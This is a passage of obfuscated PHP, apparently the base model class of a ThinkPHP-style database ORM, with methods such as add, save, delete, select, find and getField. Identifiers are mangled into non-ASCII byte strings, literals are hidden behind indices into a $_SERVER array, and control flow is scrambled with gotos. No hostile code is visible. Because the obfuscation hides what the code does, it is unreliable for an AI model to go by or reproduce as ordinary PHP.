=& $_SERVER[—Ω]; $this->_initialize(); if (!empty($FÙÊ™˘‰ÚÍ)) { if (strpos($FÙÊ™˘‰ÚÍ, $c’∫ñÚ«éú[93])) { list($this->dbName, $this->name) = explode($c’∫ñÚ«éú[93], $FÙÊ™˘‰ÚÍ); } else { $this->name = $FÙÊ™˘‰ÚÍ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($DÊ†êë”Øâ)) { $this->tablePrefix = $c’∫ñÚ«éú[33]; } elseif ($c’∫ñÚ«éú[33] != $DÊ†êë”Øâ) { $this->tablePrefix = $DÊ†êë”Øâ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($c’∫ñÚ«éú[229]); } $this->db(0, empty($this->connection) ? $cÉê©ñüç© : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $E¿—†Ÿ§“ù =& $_SERVER[—Ω]; if (empty($this->fields)) { if (think_config($E¿—†Ÿ§“ù[230])) { $cËçôµ©ï† = $this->dbName ? $this->dbName : think_config($E¿—†Ÿ§“ù[231]); $fîﬁÖ™‡Ø = think_var_cache($E¿—†Ÿ§“ù[232] . strtolower(get_path_this($cËçôµ©ï†) . $E¿—†Ÿ§“ù[93] . $this->name)); if ($fîﬁÖ™‡Ø) { $AœêéŸ¯“≤ = think_config($E¿—†Ÿ§“ù[233]); if (empty($AœêéŸ¯“≤) || $fîﬁÖ™‡Ø[$E¿—†Ÿ§“ù[234]] == $AœêéŸ¯“≤) { $this->fields = $fîﬁÖ™‡Ø; return; } } } $this->flush(); } } public function flush() { goto FÇÇ¨¨≠á∏; FÇÇ¨¨≠á∏: $aπÜ´ŒÉéç =& $_SERVER[—Ω]; $this->db->setModel($this->name); $cŒ∆◊âˆ≤è = $this->db->getFields($this->getTableName()); goto Cß∏Ëï¥Öå; Cß∏Ëï¥Öå: if (!$cŒ∆◊âˆ≤è) { return !1; } $this->fields = array_keys($cŒ∆◊âˆ≤è); $this->fields[$aπÜ´ŒÉéç[235]] = !1; goto a€äÕíé…÷; bëå⁄§öÖ‡: if (think_config($aπÜ´ŒÉéç[230])) { $a•É¨°ÜîŸ = $this->dbName ? $this->dbName : think_config($aπÜ´ŒÉéç[231]); think_var_cache($aπÜ´ŒÉéç[232] . strtolower(get_path_this($a•É¨°ÜîŸ) . $aπÜ´ŒÉéç[93] . $this->name), $this->fields); } goto F‚≤†ªıåÓ; a€äÕíé…÷: foreach ($cŒ∆◊âˆ≤è as $f®∆∞Íƒîû => $Eì˜îäŸÉÖ) { $b≠¶¢ºáÎÓ[$f®∆∞Íƒîû] = $Eì˜îäŸÉÖ[$aπÜ´ŒÉéç[29]]; if ($Eì˜îäŸÉÖ[$aπÜ´ŒÉéç[36]]) { $this->fields[$aπÜ´ŒÉéç[236]] = $f®∆∞Íƒîû; if ($Eì˜îäŸÉÖ[$aπÜ´ŒÉéç[39]]) { $this->fields[$aπÜ´ŒÉéç[235]] = !0; } } } $this->fields[$aπÜ´ŒÉéç[237]] = $b≠¶¢ºáÎÓ; if (think_config($aπÜ´ŒÉéç[233])) { $this->fields[$aπÜ´ŒÉéç[234]] = think_config($aπÜ´ŒÉéç[233]); } goto bëå⁄§öÖ‡; F‚≤†ªıåÓ: } public function switchModel($FÿÖ√êÎ≈Ì, $CÔ…£ˆŒ¬Ñ = array()) { $Bπ»Ωàáë— =& $_SERVER[—Ω]; $Dƒ§ıÆúÚ∞ = ucwords(strtolower($FÿÖ√êÎ≈Ì)) . $Bπ»Ωàáë—[238]; if (!class_exists($Dƒ§ıÆúÚ∞)) { think_exception($Dƒ§ıÆúÚ∞ . think_lang($Bπ»Ωàáë—[239])); } $this->_extModel = new $Dƒ§ıÆúÚ∞($this->name); if (!empty($CÔ…£ˆŒ¬Ñ)) { foreach ($CÔ…£ˆŒ¬Ñ as $eêÙÿ…»â¯) { $this->_extModel->setProperty($eêÙÿ…»â¯, $this->{$eêÙÿ…»â¯}); } } return $this->_extModel; } public function __set($F ÉÒäìÎã, $cØàπ§°ºƒ) { $this->data[$F ÉÒäìÎã] = $cØàπ§°ºƒ; } public function __get($eÒïÔœ∏áé) { return isset($this->data[$eÒïÔœ∏áé]) ? $this->data[$eÒïÔœ∏áé] : null; } public function __isset($dÊööÏ£ÿﬂ) { return isset($this->data[$dÊööÏ£ÿﬂ]); } public function __unset($eÌ∏µ‚ﬁ∞ï) { unset($this->data[$eÌ∏µ‚ﬁ∞ï]); } public function __call($FÍàÍ…åÔÕ, $fÕµ„ÍÑÉ⁄) { $Dû¬¢å‰∞§ =& $_SERVER[—Ω]; if (in_array(strtolower($FÍàÍ…åÔÕ), $this->methods, !0)) { $this->options[strtolower($FÍàÍ…åÔÕ)] = $fÕµ„ÍÑÉ⁄[0]; return $this; } elseif (in_array(strtolower($FÍàÍ…åÔÕ), array($Dû¬¢å‰∞§[240], $Dû¬¢å‰∞§[241], $Dû¬¢å‰∞§[242], $Dû¬¢å‰∞§[243], $Dû¬¢å‰∞§[244]), !0)) { $dìè ã√çÉ = isset($fÕµ„ÍÑÉ⁄[0]) ? $fÕµ„ÍÑÉ⁄[0] : $Dû¬¢å‰∞§[173]; $dìè ã√çÉ = $this->db->parseKey($dìè ã√çÉ); return $this->getField(strtoupper($FÍàÍ…åÔÕ) . $Dû¬¢å‰∞§[245] . $dìè ã√çÉ . $Dû¬¢å‰∞§[246] . $FÍàÍ…åÔÕ, $Dû¬¢å‰∞§[240]); } elseif (strtolower(substr($FÍàÍ…åÔÕ, 0, 5)) == $Dû¬¢å‰∞§[247]) { $dìè ã√çÉ = think_parse_name(substr($FÍàÍ…åÔÕ, 5)); $E®ç‘–à≤‰[$dìè ã√çÉ] = $fÕµ„ÍÑÉ⁄[0]; return $this->where($E®ç‘–à≤‰)->find(); } elseif (strtolower(substr($FÍàÍ…åÔÕ, 0, 10)) == $Dû¬¢å‰∞§[248]) { $bÜŒÙäÜë = think_parse_name(substr($FÍàÍ…åÔÕ, 10)); $E®ç‘–à≤‰[$bÜŒÙäÜë] = $fÕµ„ÍÑÉ⁄[0]; return $this->where($E®ç‘–à≤‰)->getField($fÕµ„ÍÑÉ⁄[1]); } elseif (isset($this->_scope[$FÍàÍ…åÔÕ])) { return $this->scope($FÍàÍ…åÔÕ, $fÕµ„ÍÑÉ⁄[0]); } elseif (method_exists($this, $FÍàÍ…åÔÕ)) { array_unshift($fÕµ„ÍÑÉ⁄, $FÍàÍ…åÔÕ); return call_user_func_array(array($this, $Dû¬¢å‰∞§[249]), $fÕµ„ÍÑÉ⁄); } else { return call_user_func_array(array(parent, $FÍàÍ…åÔÕ), $fÕµ„ÍÑÉ⁄); } } protected function call() { goto AÈ’—ñ†√∏; eÑÎøâõ®Í: if (isset($f ‘âﬁÒ¬ı[$CáÔ¿–Í”–]) && $f ‘âﬁÒ¬ı[$CáÔ¿–Í”–] === $cÎ‡ç”∞‚ù) { think_exception(__CLASS__ . $c›ò®ï∞àœ[4] . $cÎ‡ç”∞‚ù . think_lang($c›ò®ï∞àœ[250])); return; } $f ‘âﬁÒ¬ı[] = $cÎ‡ç”∞‚ù; if (method_exists($this, $c›ò®ï∞àœ[251])) { $a≠©”ï‡≈ = call_user_func_array(array($this, $c›ò®ï∞àœ[252]), array($a÷Î¿öØ¨î, $f ‘âﬁÒ¬ı)); if (!is_null($a≠©”ï‡≈) && $a≠©”ï‡≈ !== !1) { return $a≠©”ï‡≈; } } goto Bª§Î”î≈á; AÈ’—ñ†√∏: $c›ò®ï∞àœ =& $_SERVER[—Ω]; $f ‘âﬁÒ¬ı = func_get_args(); $cÎ‡ç”∞‚ù = array_shift($f ‘âﬁÒ¬ı); goto b⁄ë≤Ü«‘„; b⁄ë≤Ü«‘„: $a÷Î¿öØ¨î = $cÎ‡ç”∞‚ù; if (is_array($cÎ‡ç”∞‚ù)) { $a÷Î¿öØ¨î = $cÎ‡ç”∞‚ù[1]; $cÎ‡ç”∞‚ù = $cÎ‡ç”∞‚ù[0]; } $CáÔ¿–Í”– = count($f ‘âﬁÒ¬ı) - 1; goto eÑÎøâõ®Í; Bª§Î”î≈á: $Eë£ı£õÔè = call_user_func_array(array($this, $cÎ‡ç”∞‚ù), $f ‘âﬁÒ¬ı); if (method_exists($this, $c›ò®ï∞àœ[253])) { $a≠©”ï‡≈ = call_user_func_array(array($this, $c›ò®ï∞àœ[254]), array($a÷Î¿öØ¨î, $f ‘âﬁÒ¬ı, $Eë£ı£õÔè)); if ($a≠©”ï‡≈) { return $a≠©”ï‡≈; } } return $Eë£ı£õÔè; goto FﬂŸ≠Üµ™ò; FﬂŸ≠Üµ™ò: } protected function _initialize() { } protected function _facade($cﬁõã™òã¡) { $AÓùáù£¿ =& $_SERVER[—Ω]; if (!empty($this->fields)) { foreach ($cﬁõã™òã¡ as $E”≠ùûãçπ => $b≠”Ó»‚“ë) { if (!in_array($E”≠ùûãçπ, $this->fields, !0)) { unset($cﬁõã™òã¡[$E”≠ùûãçπ]); } elseif (is_scalar($b≠”Ó»‚“ë)) { $this->_parseType($cﬁõã™òã¡, $E”≠ùûãçπ); } } } if (!empty($this->options[$AÓùáù£¿[255]])) { $cﬁõã™òã¡ = array_map($this->options[$AÓùáù£¿[255]], $cﬁõã™òã¡); unset($this->options[$AÓùáù£¿[255]]); } $this->_beforeWrite($cﬁõã™òã¡); return $cﬁõã™òã¡; } protected function _beforeWrite(&$e© ŒóÇ®¬) { } public function add($B“∑…∏πüı = '', $DÏØ√“éçŸ = array(), $B•À°í∂™â = false) { goto aæù™°ò„»; døΩÖâ∏û«: return $A‰º∑ñ—™õ; goto dﬂ«˜“Õäü; aæù™°ò„»: if (empty($B“∑…∏πüı)) { if (!empty($this->data)) { $B“∑…∏πüı = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[—Ω][256]); return !1; } } $DÏØ√“éçŸ = $this->_parseOptions($DÏØ√“éçŸ); $B“∑…∏πüı = $this->_facade($B“∑…∏πüı); goto F˜∑¯˘¡Õ§; F˜∑¯˘¡Õ§: if (!1 === $this->_beforeInsert($B“∑…∏πüı, $DÏØ√“éçŸ)) { return !1; } $A‰º∑ñ—™õ = $this->db->insert($B“∑…∏πüı, $DÏØ√“éçŸ, $B•À°í∂™â); if (!1 !== $A‰º∑ñ—™õ) { $F àΩ ºÒŒ = $this->getLastInsID(); if ($F àΩ ºÒŒ) { $B“∑…∏πüı[$this->getPk()] = $F àΩ ºÒŒ; $this->_after_insert($B“∑…∏πüı, $DÏØ√“éçŸ); return $F àΩ ºÒŒ; } $this->_after_insert($B“∑…∏πüı, $DÏØ√“éçŸ); } goto døΩÖâ∏û«; dﬂ«˜“Õäü: } protected function _beforeInsert(&$f∫·§ﬂÓêÌ, $B¯®ÜÖ¯ëË) { } protected function _after_insert($e≤ÛÉÜÚøŒ, $fÙÎµ‘…ûÖ) { } public function addAll($c≤èÊ”ﬂ‹´, $F±¥Ì¡‹ëí = array(), $fÉä„Ù‹∂Á = false) { goto aâì¢ˆ è°; aâì¢ˆ è°: $f⁄¶≥íŸä€ =& $_SERVER[—Ω]; if (empty($c≤èÊ”ﬂ‹´)) { $this->error = think_lang($f⁄¶≥íŸä€[256]); return !1; } $F±¥Ì¡‹ëí = $this->_parseOptions($F±¥Ì¡‹ëí); goto F˜¢Ë·™ñÌ; dòÚôÓ⁄ÒÏ: return $bÜÜÂÕÓòâ; goto Fﬂ√õÎﬂ¥; F˜¢Ë·™ñÌ: foreach ($c≤èÊ”ﬂ‹´ as $c£õÎﬁÊ—ü => $d´¿©Âèãﬁ) { $c≤èÊ”ﬂ‹´[$c£õÎﬁÊ—ü] = $this->_facade($d´¿©Âèãﬁ); } if (method_exists($this->db, $f⁄¶≥íŸä€[257])) { $bÜÜÂÕÓòâ = $this->db->insertAll($c≤èÊ”ﬂ‹´, $F±¥Ì¡‹ëí, $fÉä„Ù‹∂Á); } else { $this->startTrans(); foreach ($c≤èÊ”ﬂ‹´ as $c£õÎﬁÊ—ü => $d´¿©Âèãﬁ) { $bÜÜÂÕÓòâ = $this->db->insert($d´¿©Âèãﬁ, $F±¥Ì¡‹ëí, $fÉä„Ù‹∂Á); } $this->commit(); } if (!1 !== $bÜÜÂÕÓòâ) { $a≥≠µº§®ø = $this->getLastInsID(); if ($a≥≠µº§®ø) { return $a≥≠µº§®ø; } } goto dòÚôÓ⁄ÒÏ; Fﬂ√õÎﬂ¥: } public function selectAdd($e®’ßõ÷µí = '', $dî˘Áÿ¿ı¢ = '', $FÉÁ£öÑìΩ = array()) { $E“ìπºÊÙÉ =& $_SERVER[—Ω]; $FÉÁ£öÑìΩ = $this->_parseOptions($FÉÁ£öÑìΩ); if (!1 === ($fÌò¿÷∑œ§ = $this->db->selectInsert($e®’ßõ÷µí ? $e®’ßõ÷µí : $FÉÁ£öÑìΩ[$E“ìπºÊÙÉ[258]], $dî˘Áÿ¿ı¢ ? $dî˘Áÿ¿ı¢ : $this->getTableName(), $FÉÁ£öÑìΩ))) { $this->error = think_lang($E“ìπºÊÙÉ[259]); return !1; } else { return $fÌò¿÷∑œ§; } } public function save($aÈ≤Ÿò∆„Ç = '', $câı∑Ç›Ë = array()) { goto A≥¿¬ìÏÛ⁄; A≥¿¬ìÏÛ⁄: $e œêŒıÌ¡ =& $_SERVER[—Ω]; if (empty($aÈ≤Ÿò∆„Ç)) { if (!empty($this->data)) { $aÈ≤Ÿò∆„Ç = $this->data; $this->data = array(); } else { $this->error = think_lang($e œêŒıÌ¡[256]); return !1; } } $aÈ≤Ÿò∆„Ç = $this->_facade($aÈ≤Ÿò∆„Ç); goto CÜ›Ó∑Éπÿ; CÜ›Ó∑Éπÿ: $câı∑Ç›Ë = $this->_parseOptions($câı∑Ç›Ë); $B›ÏÜëäÆ‚ = $this->getPk(); if (!isset($câı∑Ç›Ë[$e œêŒıÌ¡[260]])) { if (isset($aÈ≤Ÿò∆„Ç[$B›ÏÜëäÆ‚])) { $F∫∞º÷ª÷¿[$B›ÏÜëäÆ‚] = $aÈ≤Ÿò∆„Ç[$B›ÏÜëäÆ‚]; $câı∑Ç›Ë[$e œêŒıÌ¡[260]] = $F∫∞º÷ª÷¿; unset($aÈ≤Ÿò∆„Ç[$B›ÏÜëäÆ‚]); } else { $this->error = think_lang($e œêŒıÌ¡[259]); return !1; } } goto e≤Ñ¯ÆΩ≈Ö; e≤Ñ¯ÆΩ≈Ö: if (is_array($câı∑Ç›Ë[$e œêŒıÌ¡[260]]) && isset($câı∑Ç›Ë[$e œêŒıÌ¡[260]][$B›ÏÜëäÆ‚])) { $CÎÁ—≠∏∞ê = $câı∑Ç›Ë[$e œêŒıÌ¡[260]][$B›ÏÜëäÆ‚]; } if (!1 === $this->_beforeUpdate($aÈ≤Ÿò∆„Ç, $câı∑Ç›Ë)) { return !1; } $BÎèÛØÖò„ = $this->db->update($aÈ≤Ÿò∆„Ç, $câı∑Ç›Ë); goto fæØÊöÑó¢; fæØÊöÑó¢: if (!1 !== $BÎèÛØÖò„) { if (isset($CÎÁ—≠∏∞ê)) { $aÈ≤Ÿò∆„Ç[$B›ÏÜëäÆ‚] = $CÎÁ—≠∏∞ê; } $this->_afterUpdate($aÈ≤Ÿò∆„Ç, $câı∑Ç›Ë); } return $BÎèÛØÖò„; goto Eë∏÷∞Ç—õ; Eë∏÷∞Ç—õ: } protected function _beforeUpdate(&$D†ŸÏ‹¿¥ø, $eº±·Ìà≈√) { } protected function _afterUpdate($Fíë¬“Ìƒ», $D¿ÀøÌ⁄Œ€) { } public function delete($A÷Ñüë˘≤ù = array()) { goto B≠ÀÎ•®õ¯; fÔÒœ¡´ˆÿ: $a¯ÏÏª—†∞ = $this->db->delete($A÷Ñüë˘≤ù); if (!1 !== $a¯ÏÏª—†∞) { $dÉôÑ¶°ß€ = array(); if (isset($AÍÆÊó˜å)) { $dÉôÑ¶°ß€[$fÍã∞∆èêê] = $AÍÆÊó˜å; } $this->_after_delete($dÉôÑ¶°ß€, $A÷Ñüë˘≤ù); } return $a¯ÏÏª—†∞; goto eÌåÀ√´ëü; B≠ÀÎ•®õ¯: $E‰ä¿“π‰ò =& $_SERVER[—Ω]; if (empty($A÷Ñüë˘≤ù) && empty($this->options[$E‰ä¿“π‰ò[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $fÍã∞∆èêê = $this->getPk(); goto eäÂ¯çòãè; eäÂ¯çòãè: if (is_numeric($A÷Ñüë˘≤ù) || is_string($A÷Ñüë˘≤ù)) { if (strpos($A÷Ñüë˘≤ù, $E‰ä¿“π‰ò[47])) { $a„Öà Ÿ®√[$fÍã∞∆èêê] = array($E‰ä¿“π‰ò[261], $A÷Ñüë˘≤ù); } else { $a„Öà Ÿ®√[$fÍã∞∆èêê] = $A÷Ñüë˘≤ù; } $this->options[$E‰ä¿“π‰ò[260]] = $a„Öà Ÿ®√; } $A÷Ñüë˘≤ù = $this->_parseOptions(); if (is_array($A÷Ñüë˘≤ù[$E‰ä¿“π‰ò[260]]) && isset($A÷Ñüë˘≤ù[$E‰ä¿“π‰ò[260]][$fÍã∞∆èêê])) { $AÍÆÊó˜å = $A÷Ñüë˘≤ù[$E‰ä¿“π‰ò[260]][$fÍã∞∆èêê]; } goto fÔÒœ¡´ˆÿ; eÌåÀ√´ëü: } protected function _after_delete($Dê‹ùâ¢¬, $CÁøÜÒÉ‰ﬂ) { } public function select($B˜êú≈¢ê© = array()) { goto a¶’ÿ∫ıŸö; a¶’ÿ∫ıŸö: $DñùŸÈ‚¶˘ =& $_SERVER[—Ω]; if (is_string($B˜êú≈¢ê©) || is_numeric($B˜êú≈¢ê©)) { $bÌÖÃ±ë≠Á = $this->getPk(); if (strpos($B˜êú≈¢ê©, $DñùŸÈ‚¶˘[47])) { $a˜„≥ﬂ¬Ù°[$bÌÖÃ±ë≠Á] = array($DñùŸÈ‚¶˘[261], $B˜êú≈¢ê©); } else { $a˜„≥ﬂ¬Ù°[$bÌÖÃ±ë≠Á] = $B˜êú≈¢ê©; } $this->options[$DñùŸÈ‚¶˘[260]] = $a˜„≥ﬂ¬Ù°; } elseif (!1 === $B˜êú≈¢ê©) { $B˜êú≈¢ê© = $this->_parseOptions(); return $DñùŸÈ‚¶˘[262] . $this->db->buildSelectSql($B˜êú≈¢ê©) . $DñùŸÈ‚¶˘[263]; } $B˜êú≈¢ê© = $this->_parseOptions(); goto dÈ˜∫˜ï“ä; dÈ˜∫˜ï“ä: $Dﬁ§´·ó≥ø = $this->db->select($B˜êú≈¢ê©); if (!1 === $Dﬁ§´·ó≥ø) { return !1; } if (empty($Dﬁ§´·ó≥ø)) { return null; } goto b·¯Öö¨ØÖ; b·¯Öö¨ØÖ: $this->_afterSelect($Dﬁ§´·ó≥ø, $B˜êú≈¢ê©); return $Dﬁ§´·ó≥ø; goto d∞÷å√∆ç–; d∞÷å√∆ç–: } protected function _afterSelect(&$C≤®ãà¬àú, $f∞ëËü£üµ) { } public function buildSql($Eªû®ÜØ¨ø = array()) { $a≈ïœÈ®ÆÁ =& $_SERVER[—Ω]; $Eªû®ÜØ¨ø = $this->_parseOptions($Eªû®ÜØ¨ø); return $a≈ïœÈ®ÆÁ[262] . $this->db->buildSelectSql($Eªû®ÜØ¨ø) . $a≈ïœÈ®ÆÁ[263]; } public function optionsValue($cõÑò’ÊﬂÉ = null) { if (is_null($cõÑò’ÊﬂÉ)) { return $this->options; } elseif (is_array($cõÑò’ÊﬂÉ)) { $this->options = array_merge($this->options, $cõÑò’ÊﬂÉ); } } protected function _parseOptions($cÇŒÎâ†Ÿ¥ = array()) { goto F◊êôÖ„‚π; F◊êôÖ„‚π: $aòÚ–ßı—é =& $_SERVER[—Ω]; if (is_array($cÇŒÎâ†Ÿ¥)) { $cÇŒÎâ†Ÿ¥ = array_merge($this->options, $cÇŒÎâ†Ÿ¥); } $this->options = array(); goto eã◊ÿÀáﬁÇ; eã◊ÿÀáﬁÇ: if (!isset($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[264]])) { $cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[264]] = $this->getTableName(); $AÂ‡†èÔÑ = $this->fields; } else { $AÂ‡†èÔÑ = $this->getDbFields(); } if (!empty($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[265]])) { $cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[264]] .= $aòÚ–ßı—é[50] . $cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[265]]; } $cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[266]] = $this->name; goto dó¡ÂÕ∞ïÛ; dó¡ÂÕ∞ïÛ: if (isset($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[260]]) && is_array($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[260]]) && !empty($AÂ‡†èÔÑ) && !isset($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[267]]) && !isset($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[264]])) { foreach ($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[260]] as $fÆë∞§®éÓ => $C≤‡€€¯ÛÖ) { $fÆë∞§®éÓ = trim($fÆë∞§®éÓ); if (in_array($fÆë∞§®éÓ, $AÂ‡†èÔÑ, !0)) { if (is_scalar($C≤‡€€¯ÛÖ)) { $this->_parseType($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[260]], $fÆë∞§®éÓ); } } elseif (!is_numeric($fÆë∞§®éÓ) && $aòÚ–ßı—é[70] != substr($fÆë∞§®éÓ, 0, 1) && !1 === strpos($fÆë∞§®éÓ, $aòÚ–ßı—é[93]) && !1 === strpos($fÆë∞§®éÓ, $aòÚ–ßı—é[245]) && !1 === strpos($fÆë∞§®éÓ, $aòÚ–ßı—é[268]) && !1 === strpos($fÆë∞§®éÓ, $aòÚ–ßı—é[269])) { unset($cÇŒÎâ†Ÿ¥[$aòÚ–ßı—é[260]][$fÆë∞§®éÓ]); } } } $this->_options_filter($cÇŒÎâ†Ÿ¥); return $cÇŒÎâ†Ÿ¥; goto f™±¬±¯úö; f™±¬±¯úö: } protected function _options_filter(&$eËéÜñœ√™) { } protected function _parseType(&$cƒú∂Üî√Õ, $f‰áá›≈⁄®) { $CØ¥⁄»™€ÿ =& $_SERVER[—Ω]; if (empty($this->options[$CØ¥⁄»™€ÿ[270]][$CØ¥⁄»™€ÿ[4] . $f‰áá›≈⁄®])) { $FÍëÎä›¶á = strtolower($this->fields[$CØ¥⁄»™€ÿ[237]][$f‰áá›≈⁄®]); if (!1 !== strpos($FÍëÎä›¶á, $CØ¥⁄»™€ÿ[271])) { } elseif (!1 === strpos($FÍëÎä›¶á, $CØ¥⁄»™€ÿ[272]) && !1 !== strpos($FÍëÎä›¶á, $CØ¥⁄»™€ÿ[273])) { $cƒú∂Üî√Õ[$f‰áá›≈⁄®] = intval($cƒú∂Üî√Õ[$f‰áá›≈⁄®]); } elseif (!1 !== strpos($FÍëÎä›¶á, $CØ¥⁄»™€ÿ[274]) || !1 !== strpos($FÍëÎä›¶á, $CØ¥⁄»™€ÿ[275])) { $cƒú∂Üî√Õ[$f‰áá›≈⁄®] = floatval($cƒú∂Üî√Õ[$f‰áá›≈⁄®]); } elseif (!1 !== strpos($FÍëÎä›¶á, $CØ¥⁄»™€ÿ[276])) { $cƒú∂Üî√Õ[$f‰áá›≈⁄®] = (bool) $cƒú∂Üî√Õ[$f‰áá›≈⁄®]; } } } public function find($e∆ÑïÜ”˜¢ = array()) { goto B«»π≤÷Ã–; f„«“æÎ„–: if (!empty($this->options[$D¥ÑÑÿ÷êè[278]])) { return $this->returnResult($this->data, $this->options[$D¥ÑÑÿ÷êè[278]]); } return $this->data; goto FÏçä«ûÑÕ; bÇßÉ‚Ê˘ú: if (empty($a‚É®∆ÃØ±)) { return null; } $this->data = $a‚É®∆ÃØ±[0]; $this->_afterFind($this->data, $e∆ÑïÜ”˜¢); goto f„«“æÎ„–; B«»π≤÷Ã–: $D¥ÑÑÿ÷êè =& $_SERVER[—Ω]; if (is_numeric($e∆ÑïÜ”˜¢) || is_string($e∆ÑïÜ”˜¢)) { $cóº»±úù”[$this->getPk()] = intval($e∆ÑïÜ”˜¢); $this->options[$D¥ÑÑÿ÷êè[260]] = $cóº»±úù”; } $this->options[$D¥ÑÑÿ÷êè[277]] = 1; goto A∞…∏âÍñ˜; A∞…∏âÍñ˜: $e∆ÑïÜ”˜¢ = $this->_parseOptions(); $a‚É®∆ÃØ± = $this->db->select($e∆ÑïÜ”˜¢); if (!1 === $a‚É®∆ÃØ±) { return !1; } goto bÇßÉ‚Ê˘ú; FÏçä«ûÑÕ: } protected function _afterFind(&$B√∆œ†©¿Ë, $b¶∞ëµÊôŸ) { } protected function returnResult($BóçΩË≤‡–, $bçÑ§Ï¶‘Ì = '') { $a∆∫ö‘ò∂µ =& $_SERVER[—Ω]; if ($bçÑ§Ï¶‘Ì) { if (is_callable($bçÑ§Ï¶‘Ì)) { return call_user_func($bçÑ§Ï¶‘Ì, $BóçΩË≤‡–); } switch (strtolower($bçÑ§Ï¶‘Ì)) { case $a∆∫ö‘ò∂µ[279]: return json_encode($BóçΩË≤‡–); case $a∆∫ö‘ò∂µ[280]: return xml_encode($BóçΩË≤‡–); } } return $BóçΩË≤‡–; } public function parseFieldsMap($Dƒ∞µ∆≈ë˘, $dÉ∂»ÊÛç· = 1) { if (!empty($this->_map)) { foreach ($this->_map as $aπæáèáÇ’ => $E⁄ß√Á™ºº) { if ($dÉ∂»ÊÛç· == 1) { if (isset($Dƒ∞µ∆≈ë˘[$E⁄ß√Á™ºº])) { $Dƒ∞µ∆≈ë˘[$aπæáèáÇ’] = $Dƒ∞µ∆≈ë˘[$E⁄ß√Á™ºº]; unset($Dƒ∞µ∆≈ë˘[$E⁄ß√Á™ºº]); } } else { if (isset($Dƒ∞µ∆≈ë˘[$aπæáèáÇ’])) { $Dƒ∞µ∆≈ë˘[$E⁄ß√Á™ºº] = $Dƒ∞µ∆≈ë˘[$aπæáèáÇ’]; unset($Dƒ∞µ∆≈ë˘[$aπæáèáÇ’]); } } } } return $Dƒ∞µ∆≈ë˘; } public function setField($b∆íÂ„ë˜¨, $aØƒ≠åçõÂ = '') { if (is_array($b∆íÂ„ë˜¨)) { $cÜÓπ∫ƒ‡ÿ = $b∆íÂ„ë˜¨; } else { $cÜÓπ∫ƒ‡ÿ[$b∆íÂ„ë˜¨] = $aØƒ≠åçõÂ; } return $this->save($cÜÓπ∫ƒ‡ÿ); } public function setAdd($d–‡Ûù≈≤ã, $dçÚºâ˜Çì = 1) { $E©∂™Æ√´„ =& $_SERVER[—Ω]; $BÿêÒä§ïÁ = $d–‡Ûù≈≤ã . $E©∂™Æ√´„[281] . $dçÚºâ˜Çì; if ($dçÚºâ˜Çì < 0) { $BÿêÒä§ïÁ = $d–‡Ûù≈≤ã . $dçÚºâ˜Çì; } return $this->setField($d–‡Ûù≈≤ã, array($E©∂™Æ√´„[282], $BÿêÒä§ïÁ)); } public function getField($B‹à˜æ™’¿, $c¶Æ„ˆ¬ï◊ = null) { $Eë∫É◊åñ¥ =& $_SERVER[—Ω]; $f∂Áªö∏†§[$Eë∫É◊åñ¥[258]] = $B‹à˜æ™’¿; $f∂Áªö∏†§ = $this->_parseOptions($f∂Áªö∏†§); $B‹à˜æ™’¿ = trim($B‹à˜æ™’¿); if (strpos($B‹à˜æ™’¿, $Eë∫É◊åñ¥[47])) { if (!isset($f∂Áªö∏†§[$Eë∫É◊åñ¥[277]])) { $f∂Áªö∏†§[$Eë∫É◊åñ¥[277]] = is_numeric($c¶Æ„ˆ¬ï◊) ? $c¶Æ„ˆ¬ï◊ : $Eë∫É◊åñ¥[33]; } $cçøÉ√È≤Ï = $this->db->select($f∂Áªö∏†§); if (!empty($cçøÉ√È≤Ï)) { goto f≥Üò«≥¡; DèŸï∑÷´®: foreach ($cçøÉ√È≤Ï as $b∆Ô∂„¶◊º) { $E£≠∂ƒò”Ü = $b∆Ô∂„¶◊º[$C»Æ«——∞ü]; if (2 == $c€éÃ´ãÈô) { $fë¿ìı”øí[$E£≠∂ƒò”Ü] = $b∆Ô∂„¶◊º[$A»ê˘úâ‘ò]; } else { $fë¿ìı”øí[$E£≠∂ƒò”Ü] = is_string($c¶Æ„ˆ¬ï◊) ? implode($c¶Æ„ˆ¬ï◊, $b∆Ô∂„¶◊º) : $b∆Ô∂„¶◊º; } } return $fë¿ìı”øí; goto BÃ∂‡ãªæø; F§£Ö¡®öô: $A»ê˘úâ‘ò = array_shift($B‹à˜æ™’¿); $fë¿ìı”øí = array(); $c€éÃ´ãÈô = count($Eû¬ÎŒÑãâ); goto DèŸï∑÷´®; f≥Üò«≥¡: $Eû¬ÎŒÑãâ = explode($Eë∫É◊åñ¥[47], $B‹à˜æ™’¿); $B‹à˜æ™’¿ = array_keys($cçøÉ√È≤Ï[0]); $C»Æ«——∞ü = array_shift($B‹à˜æ™’¿); goto F§£Ö¡®öô; BÃ∂‡ãªæø: } } else { if (!0 !== $c¶Æ„ˆ¬ï◊) { $f∂Áªö∏†§[$Eë∫É◊åñ¥[277]] = is_numeric($c¶Æ„ˆ¬ï◊) ? $c¶Æ„ˆ¬ï◊ : 1; } if ($c¶Æ„ˆ¬ï◊ === $Eë∫É◊åñ¥[240]) { unset($f∂Áªö∏†§[$Eë∫É◊åñ¥[277]]); } $b∆Ô∂„¶◊º = $this->db->select($f∂Áªö∏†§); if (!empty($b∆Ô∂„¶◊º)) { if ($c¶Æ„ˆ¬ï◊ === $Eë∫É◊åñ¥[240]) { return reset($b∆Ô∂„¶◊º[0]); } if (!0 !== $c¶Æ„ˆ¬ï◊ && 1 == 